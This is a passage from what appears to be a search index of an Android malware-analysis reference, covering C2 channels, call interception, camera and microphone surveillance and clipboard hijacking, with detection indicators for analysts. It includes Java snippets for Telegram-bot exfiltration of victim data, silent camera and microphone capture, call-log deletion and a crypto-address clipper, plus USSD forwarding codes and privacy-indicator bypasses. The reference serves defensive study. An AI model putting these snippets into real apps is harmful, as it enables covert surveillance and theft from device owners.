\"https://api.telegram.org/bot\" + botToken + \"/sendMessage\";\n\nJSONObject payload = new JSONObject();\npayload.put(\"chat_id\", chatId);\npayload.put(\"text\", \"New victim: \" + deviceId + \"\\nApps: \" + appList);\n\nHttpPost post = new HttpPost(apiUrl);\npost.setEntity(new StringEntity(payload.toString()));\n</code></pre> <p>Telegram C2 is hard to take down because blocking api.telegram.org disrupts legitimate Telegram usage. The bot token can be rotated easily if compromised.</p> <p>Used by: Anubis, Mamont, Cerberus (dead drop), SpyNote (some variants).</p>"},{"location":"attacks/c2-techniques/#dead-drop-resolvers","title":"Dead Drop Resolvers","text":"<p>The malware does not hardcode the C2 address directly. Instead, it fetches the real C2 URL from a public service that the attacker controls. If the C2 goes down, the attacker updates the dead drop with a new address without needing to update the malware.</p> <p>Common dead drop platforms:</p> Platform Method Example Telegram Public channel with pinned message containing encrypted C2 URL Channel bio or pinned post has Base64-encoded address Pastebin Paste containing encrypted/encoded C2 address <code>https://pastebin.com/raw/XXXXXX</code> GitHub Repository file or gist with C2 info README or config file in a public repo Twitter/X Tweet or bio containing encoded address Profile bio with hex-encoded URL YouTube Video description with hidden C2 string Comment or description field <p>Cerberus stored encrypted C2 URLs in a Twitter bio. GodFather used Telegram channel descriptions. MoqHao used Pinterest profile descriptions.</p> <p>Dead Drop Analysis</p> <p>When you find a dead drop resolver, check if the attacker is still actively updating the public profile. Extracting historical dead drop values (via Wayback Machine or platform-specific caches) can reveal the full list of C2 servers used over the campaign's lifetime.</p>"},{"location":"attacks/c2-techniques/#dns-tunneling-and-dns-over-https","title":"DNS Tunneling and DNS-over-HTTPS","text":"<p>Encodes C2 data inside DNS queries. The malware makes DNS lookups for subdomains like <code>base64data.evil.com</code>, and the authoritative DNS server decodes the subdomain to extract data. Responses come back as TXT or CNAME records.</p> <p>DNS-over-HTTPS (DoH) variant sends DNS queries as HTTPS requests to resolvers like <code>https://dns.google/resolve?name=...</code>, bypassing traditional DNS monitoring entirely. This doubles as a way to resolve DGA domains without touching the device's configured DNS.</p> <p>Less common on Android than on desktop malware due to implementation complexity, but observed in targeted espionage tools.</p>"},{"location":"attacks/c2-techniques/#mqtt-protocol","title":"MQTT Protocol","text":"<p>Lightweight publish/subscribe messaging protocol designed for IoT. Some malware families use public MQTT brokers (like mqtt.eclipseprojects.io) for C2, publishing commands to bot-specific topics.</p> <p>Low overhead, persistent connections, works well on unreliable mobile networks. Hard to distinguish from legitimate IoT traffic.</p>"},{"location":"attacks/c2-techniques/#sms-based-c2","title":"SMS-Based C2","text":"<p>The malware receives commands via incoming SMS messages from a specific number or matching a specific format. Older technique, still used as a fallback when internet connectivity is unavailable.</p> <p>Commands are typically short codes: <code>#lock#</code>, <code>#sms_forward#ON</code>, <code>#wipe#</code>. The malware's <code>BroadcastReceiver</code> intercepts the SMS before the default messaging app displays it.</p> <p>Disadvantages: sender number is traceable, SMS costs money at scale, limited payload size.</p> <p>Used by: BankBot, early Anubis variants, Rafel RAT.</p>"},{"location":"attacks/c2-techniques/#sftpftp-exfiltration","title":"SFTP/FTP Exfiltration","text":"<p>Direct file upload for exfiltrating large data: screen recordings, keylog files, photo archives. The malware connects to an attacker-controlled SFTP server and uploads files on a schedule or when triggered.</p> <p>Vultur uses SFTP (via JSch library) specifically for uploading screen recordings, keeping its HTTP C2 channel separate for commands.</p>"},{"location":"attacks/c2-techniques/#proxytunnel-c2","title":"Proxy/Tunnel C2","text":"<p>The infected device acts as a network proxy, routing attacker traffic through the victim's connection. McAfee documented TimpDoor (2018), distributed via SMS phishing as a fake voice-message app, which created a SOCKS proxy and redirected traffic through an SSH-encrypted tunnel. Over 5,000 devices were enrolled, giving attackers stealthy access through residential IP addresses. This turns compromised phones into a proxy botnet for masking other malicious activity.</p>"},{"location":"attacks/c2-techniques/#toronion-routing","title":"Tor/Onion Routing","text":"<p>Routes C2 traffic through the Tor network, hiding the server's real IP address. The malware either bundles Tor libraries or uses Orbot as a proxy. The C2 runs as a .onion hidden service.</p> <p>Adds significant latency and battery drain. Increases APK size if Tor is bundled. Some families use Tor only for C2 registration and fall back to direct HTTPS for data transfer.</p>"},{"location":"attacks/c2-techniques/#domain-generation-algorithms-dga","title":"Domain Generation Algorithms (DGA)","text":"<p>The malware generates a list of pseudo-random domain names using a seed (date, hardcoded value, or external input). The attacker registers one or more of these domains ahead of time. If a domain is seized, the algorithm generates new candidates the next day.</p> <pre><code>public String generateDomain(int dayOfYear, int year) {\n    long seed = (dayOfYear * 1000L) + year;\n    Random rng = new Random(seed);\n    StringBuilder domain = new StringBuilder();\n    int len = rng.nextInt(8) + 8;\n    for (int i = 0; i &lt; len; i++) {\n        domain.append((char) ('a' + rng.nextInt(26)));\n    }\n    domain.append(\".com\");\n    return domain.toString();\n}\n</code></pre> <p>The defender must reverse the DGA to predict and preemptively sinkhole future domains. DGA is less common on Android than on desktop botnets, but has been observed in Anubis and FluBot.</p>"},{"location":"attacks/c2-techniques/#certificate-pinning-on-c2-traffic","title":"Certificate Pinning on C2 Traffic","text":"<p>Malware pinning its own C2 server's certificate to prevent interception by analysts or network security tools. The attacker embeds the server certificate or public key hash in the APK and rejects any connection where the certificate doesn't match.</p> <p>This is the reverse of the usual scenario: instead of a legitimate app pinning its server, the malware pins the attacker's server. An analyst running mitmproxy sees the connection fail unless they patch out the pinning logic first.</p> <p>Bypassing Malware Certificate Pinning</p> <p>Use Frida's <code>ssl_pinning_bypass.js</code> or patch the APK's <code>TrustManager</code> / <code>CertificatePinner</code> at the smali level. See Hooking for Frida-based approaches and Network Analysis for mitmproxy setup.</p>"},{"location":"attacks/c2-techniques/#c2-method-comparison","title":"C2 Method Comparison","text":"Method Stealth Reliability Latency Bandwidth Takedown Resistance HTTP/HTTPS Medium High Low High Low -- domain seizure WebSocket Medium Medium Very Low High Low FCM Very High High Low Low Medium -- project revocation Telegram Bot High Very High Medium Medium High Dead Drop High Medium High Very Low High DNS Tunnel Very High Medium High Very Low High MQTT High Medium Low Medium Medium SMS Low Low Medium Very Low Low -- traceable SFTP/FTP Low High Medium Very High Low Tor Very High Low Very High Medium Very High DGA Medium Medium High High High"},{"location":"attacks/c2-techniques/#families-by-primary-c2-type","title":"Families by Primary C2 Type","text":"Family Primary C2 Secondary C2 Exfiltration Anubis HTTP REST Telegram Bot HTTP POST Ermac HTTP REST FCM wake-up HTTP POST Hook WebSocket HTTP REST WebSocket Cerberus HTTP REST Telegram dead drop, FCM HTTP POST Medusa WebSocket HTTP REST WebSocket SpyNote Custom TCP None TCP socket Vultur HTTP REST FCM wake-up SFTP Mamont Telegram Bot None Telegram API BRATA HTTP REST None HTTP POST GodFather HTTP REST Telegram dead drop, FCM HTTP POST Octo HTTP REST WebSocket (v2) HTTP POST Hydra HTTP REST None HTTP POST Anatsa HTTP REST FCM wake-up HTTP POST FluBot HTTP REST + DGA DNS-based DGA HTTP POST MoqHao HTTP REST Dead drop (Pinterest/Imgur) HTTP POST Xenomorph HTTP REST None HTTP POST Chameleon HTTP REST None HTTP POST TrickMo HTTP REST None HTTP POST Copybara HTTP REST MQTT HTTP POST"},{"location":"attacks/c2-techniques/#network-analysis","title":"Network Analysis","text":""},{"location":"attacks/c2-techniques/#intercepting-c2-traffic","title":"Intercepting C2 Traffic","text":"<p>Setting up mitmproxy to capture C2 communications during dynamic analysis:</p> <ol> <li>Install mitmproxy CA certificate on the test device</li> <li>Configure Wi-Fi proxy or use transparent proxy with iptables</li> <li>If malware pins its C2 certificate, patch the APK to remove pinning (Frida <code>ssl_pinning_bypass.js</code> or manual smali edit)</li> <li>Monitor for registration beacons, command polling intervals, and exfiltration uploads</li> </ol>"},{"location":"attacks/c2-techniques/#identifying-c2-patterns","title":"Identifying C2 Patterns","text":"<p>Common indicators in network traffic:</p> <ul> <li>Periodic POST requests to the same endpoint (heartbeat/polling)</li> <li>JSON payloads containing device identifiers, IMEI, installed app lists</li> <li>Base64-encoded or encrypted request bodies</li> <li>Requests to <code>api.telegram.org</code> with bot tokens</li> <li>FCM registration tokens sent to non-Google servers</li> <li>Connections to known MQTT brokers</li> <li>DNS queries for high-entropy domain names (DGA indicator)</li> <li>WebSocket upgrades to suspicious endpoints</li> </ul>"},{"location":"attacks/c2-techniques/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li>Hardcoded URLs, IPs, or domain patterns in strings/resources</li> <li>Telegram bot tokens (format: <code>[0-9]+:AA[A-Za-z0-9_-]+</code>)</li> <li>Firebase configuration files (<code>google-services.json</code>) with unexpected project IDs</li> <li>JSch or other SSH/SFTP library imports</li> <li><code>WebSocketListener</code> or OkHttp WebSocket usage</li> <li><code>DnsOverHttps</code> or custom DNS resolution code</li> <li>Certificate pinning implementations (custom <code>TrustManager</code>, <code>CertificatePinner</code>)</li> </ul> Dynamic Indicators <ul> <li>Outbound connections immediately after first launch</li> <li>Periodic network requests at fixed intervals</li> <li>Data sent to Telegram API endpoints</li> <li>Large file uploads to SFTP servers</li> <li>Connections to Tor entry nodes or .onion addresses</li> </ul>"},{"location":"attacks/call-interception/","title":"Call Interception &amp; Voice Phishing","text":"<p>Intercepting, redirecting, and faking phone calls on Android to conduct voice phishing (vishing) attacks. Unlike traditional phishing that targets text-based credentials, call interception exploits the inherent trust users place in voice communication with their bank. The victim dials their bank's real number, but the malware silently redirects the call to an attacker-controlled line where a human operator or pre-recorded IVR extracts sensitive information.</p> <p>See also: Phishing Techniques, SMS Interception, Accessibility Abuse</p> <p>Requirements</p> Requirement Details Call handler Default phone handler role (user must approve) Permissions <code>CALL_PHONE</code>, <code>READ_PHONE_STATE</code>, <code>BIND_ACCESSIBILITY_SERVICE</code> Alternative <code>CallRedirectionService</code> role (Android 10+)"},{"location":"attacks/call-interception/#call-redirection-techniques","title":"Call Redirection Techniques","text":""},{"location":"attacks/call-interception/#default-call-handler-exploitation","title":"Default Call Handler Exploitation","text":"<p>The most powerful technique. When the malware becomes the default call handler, it manages the entire call lifecycle: dialing, connecting, displaying the in-call UI, and ending calls. This gives it complete control over what the user sees and hears.</p> <p>FakeCall (also tracked as FakeCalls) pioneered this approach. First reported by Kaspersky in April 2022, the malware prompts the user to set it as the default call handler during installation. Once approved:</p> <ol> <li>User dials their bank's real phone number</li> <li>FakeCall intercepts the outgoing call intent</li> <li>The real call is cancelled silently</li> <li>FakeCall displays a fake call UI showing the bank's real number</li> <li>The call is routed to an attacker-controlled number</li> <li>A human operator or pre-recorded IVR answers as the bank</li> </ol> <p>The fake call UI mimics the native Android dialer so convincingly that the victim sees their bank's name and number on screen while actually speaking to the attacker. Zimperium's 2024 analysis documented expanded capabilities including accessibility service abuse for automatic permission grants, <code>MediaProjection</code> for screen streaming, and camera/photo capabilities.</p>"},{"location":"attacks/call-interception/#callredirectionservice-android-10","title":"CallRedirectionService (Android 10+)","text":"<p>Android 10 replaced the deprecated <code>PROCESS_OUTGOING_CALLS</code> broadcast with <code>CallRedirectionService</code>, a dedicated API for legitimate call redirection (e.g., VoIP routing). Malware can register as a call redirection service:</p> <pre><code>&lt;service android:name=\".MaliciousRedirector\"\n    android:permission=\"android.permission.BIND_CALL_REDIRECTION_SERVICE\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.telecom.CallRedirectionService\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/service&gt;\n</code></pre> <p>The user must approve the app for the call redirection role via <code>RoleManager</code>. Once granted, the service receives <code>onPlaceCall()</code> for every outgoing call and can redirect it to any number via <code>redirectCall()</code>.</p>"},{"location":"attacks/call-interception/#ussd-code-forwarding","title":"USSD Code Forwarding","text":"<p>Malware with <code>CALL_PHONE</code> permission can silently dial USSD codes to enable unconditional call forwarding at the carrier level:</p> USSD Code Function <code>*21*[number]#</code> Unconditional forwarding (all calls) <code>*67*[number]#</code> Forward when busy <code>*61*[number]#</code> Forward when unanswered <code>*62*[number]#</code> Forward when unreachable <code>##21#</code> Deactivate forwarding <p>This technique works transparently at the network level. The victim's phone never rings; calls go directly to the attacker. No special permissions beyond <code>CALL_PHONE</code> are required because USSD codes are dialed as regular calls.</p>"},{"location":"attacks/call-interception/#voip-based-interception","title":"VoIP-Based Interception","text":""},{"location":"attacks/call-interception/#letscall","title":"Letscall","text":"<p>ThreatFabric documented Letscall in July 2023 as a sophisticated three-stage vishing toolkit targeting South Korean users.</p> Stage Component Function 1 Downloader Prepares device, installs spyware payload 2 Spyware Establishes VoIP infrastructure using ZEGOCLOUD WebRTC SDK 3 Call companion Redirects calls to attacker call center, enables P2P voice/video <p>The VoIP layer uses WebRTC with STUN/TURN servers (including Google's public STUN servers) for NAT traversal. The same P2P channel serves as both the voice call pathway and the C2 communication channel. Evasion included Tencent Legu and Bangcle obfuscation, long ZIP directory names, and manifest corruption.</p>"},{"location":"attacks/call-interception/#fake-ivr-systems","title":"Fake IVR Systems","text":"<p>Pre-recorded Interactive Voice Response systems that mimic a bank's phone menu. When the victim \"calls their bank\" (actually reaching the attacker), they hear:</p> <ol> <li>Welcome message matching the bank's real greeting</li> <li>Menu options (\"Press 1 for account balance, Press 2 for card services...\")</li> <li>Prompts for card number, PIN, or OTP via keypad</li> <li>Keypad input captured by the malware or VoIP system</li> </ol> <p>FakeCall maintains recorded IVR audio for multiple Korean financial institutions. The recordings are convincing enough that victims enter their full card details and PINs via the phone keypad.</p>"},{"location":"attacks/call-interception/#call-recording","title":"Call Recording","text":""},{"location":"attacks/call-interception/#android-version-restrictions","title":"Android Version Restrictions","text":"Version Change Impact Pre-Android 9 <code>MediaRecorder</code> + <code>AudioSource.VOICE_CALL</code> worked freely Full call recording possible Android 9 <code>VOICE_CALL</code> audio source restricted Apps must use <code>VOICE_RECOGNITION</code> or accessibility workarounds Android 10 Background microphone access restricted Foreground service required Android 11+ Further restrictions on call recording APIs Third-party call recording effectively blocked for legitimate apps"},{"location":"attacks/call-interception/#malware-workarounds","title":"Malware Workarounds","text":"<p>Despite platform restrictions, malware achieves call recording through:</p> <ol> <li>Accessibility + MediaRecorder: The accessibility service detects call state, then a foreground service records via <code>AudioSource.MIC</code> (captures the user's voice and speaker output in speakerphone mode)</li> <li>MediaProjection screen capture with audio: Captures system audio output including the call (requires one-time user consent for the MediaProjection dialog)</li> <li>Speaker recording: Forces speakerphone mode via accessibility, then records ambient audio via microphone</li> </ol> <p>SpyNote uses a background service with <code>MediaRecorder</code> set to <code>AudioSource.MIC</code> to record call audio, saving files to external storage. On Android 9+, it uses a foreground service with <code>IMPORTANCE_MIN</code> notification to maintain microphone access.</p>"},{"location":"attacks/call-interception/#call-log-manipulation","title":"Call Log Manipulation","text":"<p>With <code>READ_CALL_LOG</code> and <code>WRITE_CALL_LOG</code> permissions, malware can:</p> <ul> <li>Read call history to identify banking calls</li> <li>Delete evidence of redirected or recorded calls</li> <li>Insert fake call log entries to maintain the illusion of a real bank call</li> </ul> <pre><code>getContentResolver().delete(\n    CallLog.Calls.CONTENT_URI,\n    CallLog.Calls.NUMBER + \" = ?\",\n    new String[]{attackerNumber}\n);\n</code></pre>"},{"location":"attacks/call-interception/#families-using-call-interception","title":"Families Using Call Interception","text":"Family Technique Targets Source FakeCall/FakeCalls Default call handler, fake UI, IVR Korean banks Kaspersky, Zimperium Letscall VoIP via WebRTC/ZEGOCLOUD, STUN/TURN relay Korean users ThreatFabric Cerberus SMS/call interception, 2FA bypass European banks Malpedia SpyNote Call recording via foreground service Global CYFIRMA Medusa Call/SMS interception, accessibility logging Turkish/European banks ThreatFabric"},{"location":"attacks/call-interception/#android-version-timeline","title":"Android Version Timeline","text":"Version Change Impact on Malware Pre-6.0 All permissions granted at install Call interception trivial 6.0 Runtime permissions for <code>CALL_PHONE</code>, <code>READ_PHONE_STATE</code> User must grant explicitly; accessibility auto-grants 9.0 <code>VOICE_CALL</code> audio source restricted Call recording moves to <code>MIC</code> source with speakerphone 10 <code>PROCESS_OUTGOING_CALLS</code> deprecated; <code>CallRedirectionService</code> introduced Malware adopts new API or uses default handler approach 10+ Background microphone restrictions Foreground service required for recording 14+ Foreground service type declaration required Must declare <code>microphone</code> type in manifest"},{"location":"attacks/call-interception/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>android.telecom.CallRedirectionService</code> in manifest</li> <li>Request for <code>ROLE_CALL_REDIRECTION</code> via <code>RoleManager</code></li> <li><code>TelecomManager</code> API usage (especially <code>getDefaultDialerPackage()</code>)</li> <li>USSD code strings (<code>*21*</code>, <code>*67*</code>, <code>*61*</code>) in code or resources</li> <li>Audio recording setup (<code>MediaRecorder</code>, <code>AudioRecord</code>) near telephony state listeners</li> <li><code>CALL_PHONE</code> + <code>READ_PHONE_STATE</code> + <code>READ_CALL_LOG</code> permission combination</li> </ul> Dynamic Indicators <ul> <li>App requests default phone handler role</li> <li>Outgoing calls to known bank numbers redirected to different destinations</li> <li>USSD codes dialed programmatically</li> <li>Audio recording service started during call state changes</li> <li>Call log entries deleted after suspicious calls</li> <li>WebRTC/VoIP library initialization without visible video/voice UI</li> </ul>"},{"location":"attacks/camera-mic-surveillance/","title":"Camera &amp; Microphone Surveillance","text":"<p>Silent capture of audio and video from a compromised Android device. Spyware and banking trojans use the camera and microphone for ambient recording, live streaming, screenshot capture, and call recording. The objective ranges from targeted intelligence gathering (state-sponsored spyware like Pegasus) to mass credential harvesting (banking trojans recording screen during login).</p> <p>See also: Screen Capture, Keylogging, Accessibility Abuse, Call Interception</p> <p>Requirements</p> Requirement Details Camera <code>CAMERA</code> runtime permission + foreground service with <code>camera</code> type (Android 14+) Microphone <code>RECORD_AUDIO</code> runtime permission + foreground service with <code>microphone</code> type (Android 14+) Screen capture <code>MediaProjection</code> consent dialog (one-time) or <code>BIND_ACCESSIBILITY_SERVICE</code> for screenshot commands Background access Foreground service must be started while app is in foreground; once running, persists in background"},{"location":"attacks/camera-mic-surveillance/#camera-capture","title":"Camera Capture","text":""},{"location":"attacks/camera-mic-surveillance/#silent-photography","title":"Silent Photography","text":"<p>Malware opens the camera API in the background to capture photos without any visible UI. On Android 9+, background camera access requires a foreground service started while the app was visible.</p> <pre><code>CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);\nmanager.openCamera(cameraId, new CameraDevice.StateCallback() {\n    @Override\n    public void onOpened(CameraDevice camera) {\n        CaptureRequest.Builder builder = camera.createCaptureRequest(\n            CameraDevice.TEMPLATE_STILL_CAPTURE);\n        builder.addTarget(imageReader.getSurface());\n        camera.createCaptureSession(outputSurfaces, sessionCallback, handler);\n    }\n}, backgroundHandler);\n</code></pre> <p>SpyNote captures photos from both front and rear cameras on C2 command. CYFIRMA's analysis documented the implementation: the malware uses a foreground service with <code>IMPORTANCE_MIN</code> notification to maintain camera access while appearing invisible in the notification shade.</p>"},{"location":"attacks/camera-mic-surveillance/#video-recording","title":"Video Recording","text":"<p>Continuous video recording uses <code>MediaRecorder</code> or <code>Camera2</code> API with an output surface writing to internal storage. The video file is chunked and exfiltrated to C2 in segments to avoid large file transfers that might alert the user to unusual data usage.</p> <p>Pegasus (Chrysaor on Android) provides full camera and video surveillance. Lookout's 2017 technical analysis documented how the native code component hooks into the camera process, with the Java layer coordinating surveillance functions. Google's investigation confirmed that once installed, a remote operator can surveil the victim's activities on the device and within the vicinity, leveraging the microphone, camera, and data collection capabilities.</p>"},{"location":"attacks/camera-mic-surveillance/#microphone-recording","title":"Microphone Recording","text":""},{"location":"attacks/camera-mic-surveillance/#ambient-audio-capture","title":"Ambient Audio Capture","text":"<p>The most common audio surveillance technique. Malware starts <code>MediaRecorder</code> or <code>AudioRecord</code> with <code>AudioSource.MIC</code> to capture surrounding audio.</p> <pre><code>MediaRecorder recorder = new MediaRecorder();\nrecorder.setAudioSource(MediaRecorder.AudioSource.MIC);\nrecorder.setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS);\nrecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);\nrecorder.setOutputFile(outputPath);\nrecorder.prepare();\nrecorder.start();\n</code></pre> <p>SpyNote uses a background service with <code>MediaRecorder</code> set to <code>AudioSource.MIC</code> to record ambient audio, saving files to external storage. On Android 9+, it uses a foreground service with minimal notification importance to maintain microphone access.</p>"},{"location":"attacks/camera-mic-surveillance/#call-audio-recording","title":"Call Audio Recording","text":"<p>Recording phone calls is increasingly restricted. See Call Interception for the full Android version timeline. Malware workarounds include:</p> <ol> <li>Speakerphone + MIC: Force speakerphone via accessibility service, then record ambient audio via microphone</li> <li>MediaProjection audio: Capture system audio output including call audio (requires one-time consent dialog)</li> <li>Accessibility + MediaRecorder: Detect call state via accessibility, start foreground service recording via <code>AudioSource.MIC</code></li> </ol>"},{"location":"attacks/camera-mic-surveillance/#live-audio-streaming","title":"Live Audio Streaming","text":"<p>Pegasus supports live audio surveillance triggered by receiving a call from an attacker-specified number. The malware silently answers and streams ambient audio captured by the device microphone back to the operator. The addk.so native library injects shellcode into the keyboard process memory space for keystroke capture alongside audio.</p>"},{"location":"attacks/camera-mic-surveillance/#screen-based-capture","title":"Screen-Based Capture","text":""},{"location":"attacks/camera-mic-surveillance/#mediaprojection-screen-recording","title":"MediaProjection Screen Recording","text":"<p><code>MediaProjection</code> captures the entire screen including all app content. Android requires a user consent dialog before granting access, but malware uses accessibility services to auto-tap \"Start Now\" on the consent prompt.</p> <p>Once granted, <code>MediaProjection</code> provides a <code>VirtualDisplay</code> surface that mirrors the screen. The malware encodes frames as video or captures individual screenshots at intervals.</p> <p>LianSpy, discovered by Kaspersky targeting Russian users (active since July 2021, reported August 2024), uses the <code>screencap</code> system command with root permissions to take screenshots instead of <code>MediaProjection</code>, leaving no trace of screenshot capture. LianSpy stores captured data on Yandex Disk as its C2 channel, searching for config files matching the regex <code>^frame_.+\\.png$</code> every 30 seconds.</p>"},{"location":"attacks/camera-mic-surveillance/#privacy-indicator-bypass","title":"Privacy Indicator Bypass","text":"<p>Android 12 introduced privacy indicators (green dot in status bar) when camera or microphone are active. LianSpy bypasses this by appending a cast value to the <code>icon_blacklist</code> Android secure setting parameter, preventing notification icons from appearing in the status bar.</p>"},{"location":"attacks/camera-mic-surveillance/#accessibility-based-screenshot","title":"Accessibility-Based Screenshot","text":"<p>Malware with accessibility service access can use <code>AccessibilityService.takeScreenshot()</code> (Android 9+) to capture screen content without <code>MediaProjection</code>. This method does not trigger the privacy indicator since it operates through the accessibility framework rather than the camera/microphone APIs.</p>"},{"location":"attacks/camera-mic-surveillance/#state-sponsored-spyware","title":"State-Sponsored Spyware","text":"<p>Commercial and state-sponsored spyware represents the most sophisticated camera/microphone surveillance on Android.</p> Family Camera Microphone Screen Key Technique Source Pegasus Yes Live stream Yes Framaroot exploit for privilege escalation, native hooks Lookout, Google Predator Yes Yes Yes Exploit chain delivery, 5-module architecture Cisco Talos Hermit Yes Yes Yes RCS Lab commercial spyware, ISP-level delivery Lookout FinSpy Yes Yes Yes Gamma Group, DexGuard-packed, targets dissidents Amnesty International LianSpy No No Yes (screencap) Yandex Disk C2, privacy indicator bypass, root-level Kaspersky GuardZoo Yes Yes No Houthi-targeting, Dendroid RAT fork Lookout"},{"location":"attacks/camera-mic-surveillance/#banking-trojan-surveillance","title":"Banking Trojan Surveillance","text":"<p>Banking trojans use camera/microphone primarily for credential capture during fraud, not long-term surveillance.</p> Family Camera Microphone Screen Purpose SpyNote Both cameras Ambient + call MediaProjection Full RAT with surveillance as primary function Hook Yes Yes VNC stream Remote access during ATS, screen dimmed to zero Octo No No Screenshot stream <code>SHIT_QUALITY</code> mode for bandwidth-efficient screen streaming Vultur No No Screen recording AlphaVNC + ngrok for real-time remote access Crocodilus Yes No Black overlay Camera for selfie capture, screen hidden during ATS"},{"location":"attacks/camera-mic-surveillance/#android-version-timeline","title":"Android Version Timeline","text":"Version Change Impact on Surveillance Pre-6.0 Camera/microphone permissions granted at install Trivial access 6.0 Runtime permissions for <code>CAMERA</code> and <code>RECORD_AUDIO</code> User must grant explicitly; accessibility auto-grants 9.0 Background camera access restricted Foreground service required; must be started while app is visible 9.0 <code>VOICE_CALL</code> audio source restricted Call recording moves to <code>MIC</code> source workarounds 10 Background microphone access restricted Foreground service required 11 Foreground service must declare <code>camera</code>/<code>microphone</code> type Manifest declaration reveals intent 12 Privacy indicators (green dot) for camera/microphone Visual indicator to user; bypassed by LianSpy 14 Foreground service type <code>camera</code>/<code>microphone</code> required Cannot start camera/microphone FGS from background 14 Microphone FGS cannot launch from <code>BOOT_COMPLETED</code> Breaks boot-time ambient recording 14 System CA certificates moved to immutable APEX Related: HTTPS interception for data exfil harder 15 Camera FGS also blocked from <code>BOOT_COMPLETED</code> Further restricts boot-time surveillance"},{"location":"attacks/camera-mic-surveillance/#evasion-techniques","title":"Evasion Techniques","text":"Technique Implementation Used By Minimal notification <code>IMPORTANCE_MIN</code> foreground service notification SpyNote, most spyware Accessibility auto-grant Tap through <code>MediaProjection</code> consent dialog Banking trojans with accessibility Root-level screencap Use <code>screencap</code> binary instead of API LianSpy Privacy indicator bypass Modify <code>icon_blacklist</code> setting LianSpy Scheduled capture Only activate during specific C2-triggered windows Pegasus, Predator Low-quality encoding Reduce resolution/bitrate to minimize data usage Octo (<code>SHIT_QUALITY</code> mode)"},{"location":"attacks/camera-mic-surveillance/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>CAMERA</code> + <code>RECORD_AUDIO</code> permissions without camera-related UI in the app</li> <li><code>MediaRecorder</code> or <code>AudioRecord</code> initialization in background services</li> <li><code>MediaProjection</code> <code>createScreenCaptureIntent()</code> without user-facing recording UI</li> <li>Foreground service type <code>camera</code> or <code>microphone</code> in manifest</li> <li><code>screencap</code> or <code>screenrecord</code> command strings</li> <li><code>icon_blacklist</code> string in code (privacy indicator bypass)</li> </ul> Dynamic Indicators <ul> <li>Camera LED activating without user-initiated camera action</li> <li>Privacy indicator (green dot) appearing and disappearing rapidly</li> <li>Foreground service running with camera/microphone type</li> <li>Audio files or screenshots appearing in app-private storage</li> <li>Network traffic spikes during ambient recording upload</li> <li><code>MediaProjection</code> consent dialog auto-dismissed</li> </ul>"},{"location":"attacks/clipboard-hijacking/","title":"Clipboard Hijacking","text":"<p>Monitoring or modifying clipboard contents to steal sensitive data. Android's <code>ClipboardManager</code> API provides a system-wide clipboard that any foreground app can read and write. Malware abuses this to intercept cryptocurrency wallet addresses, passwords, OTPs, and banking data as users copy and paste between apps. The most destructive variant, the crypto clipper, silently replaces a copied wallet address with one controlled by the attacker, redirecting transactions without the victim noticing.</p> <p>Requirements</p> Requirement Details Permission None for foreground access. <code>BIND_ACCESSIBILITY_SERVICE</code> for background or silent clipboard reads on Android 10+. Condition App must be in foreground, or running an accessibility service, to access clipboard on Android 10+"},{"location":"attacks/clipboard-hijacking/#how-it-works","title":"How It Works","text":""},{"location":"attacks/clipboard-hijacking/#clipboardmanager-listener","title":"ClipboardManager Listener","text":"<p>The primary mechanism. The app registers a listener that fires every time clipboard content changes:</p> <pre><code>ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);\ncm.addPrimaryClipChangedListener(() -&gt; {\n    ClipData clip = cm.getPrimaryClip();\n    String text = clip.getItemAt(0).getText().toString();\n    if (matchesCryptoAddress(text)) {\n        cm.setPrimaryClip(ClipData.newPlainText(\"\", attackerWallet));\n    }\n});\n</code></pre> <p>The listener runs in the app's process. On Android 10+, the app must be in the foreground or running a foreground service to receive clipboard change events. Malware circumvents this by maintaining a persistent foreground notification (often disguised as a system service) or by using an accessibility service.</p>"},{"location":"attacks/clipboard-hijacking/#accessibility-based-clipboard-reading","title":"Accessibility-Based Clipboard Reading","text":"<p>An accessibility service can read clipboard contents without triggering the user-visible clipboard access toast introduced in Android 12. The service monitors <code>TYPE_VIEW_TEXT_CHANGED</code> and <code>TYPE_WINDOW_CONTENT_CHANGED</code> events, then reads the clipboard when it detects the user has performed a paste action or is interacting with a text field in a target app.</p> <p>On pre-Android 10 devices, accessibility services can read clipboard at any time without restriction. On Android 10+, the accessibility service still has unrestricted clipboard access, making it the preferred method for modern malware.</p>"},{"location":"attacks/clipboard-hijacking/#contentobserver-on-clipboard-uri","title":"ContentObserver on Clipboard URI","text":"<p>Some families register a <code>ContentObserver</code> on the clipboard content URI to detect changes passively. This is less common than the listener approach but achieves the same result with a different triggering mechanism.</p>"},{"location":"attacks/clipboard-hijacking/#attack-patterns","title":"Attack Patterns","text":""},{"location":"attacks/clipboard-hijacking/#crypto-address-replacement-clipper","title":"Crypto Address Replacement (Clipper)","text":"<p>The highest-value clipboard attack. The malware monitors for cryptocurrency wallet addresses using regex patterns, then replaces them with attacker-controlled addresses before the user pastes:</p> Cryptocurrency Address Pattern Example Regex Bitcoin (BTC) Starts with <code>1</code>, <code>3</code>, or <code>bc1</code>, 26-62 chars <code>^(bc1\\|[13])[a-zA-HJ-NP-Z0-9]{25,62}$</code> Ethereum (ETH) Starts with <code>0x</code>, 42 hex chars <code>^0x[0-9a-fA-F]{40}$</code> TRON (TRX) Starts with <code>T</code>, 34 chars <code>^T[1-9A-HJ-NP-Za-km-z]{33}$</code> Litecoin (LTC) Starts with <code>L</code>, <code>M</code>, or <code>ltc1</code> <code>^(ltc1\\|[LM])[a-zA-HJ-NP-Z0-9]{25,62}$</code> Ripple (XRP) Starts with <code>r</code>, 25-35 chars <code>^r[0-9a-zA-Z]{24,34}$</code> <p>The replacement is instant. The user copies a legitimate address from an exchange or message, the malware swaps it, and the user pastes the attacker's address into their wallet app. The transaction confirmation screen shows the attacker's address, but most users don't compare the full address string.</p> <p>Some families maintain multiple attacker wallets and select the replacement address based on the cryptocurrency type and address format detected.</p>"},{"location":"attacks/clipboard-hijacking/#credential-harvesting","title":"Credential Harvesting","text":"<p>Malware monitors clipboard for patterns matching:</p> <ul> <li>Passwords (copied from password 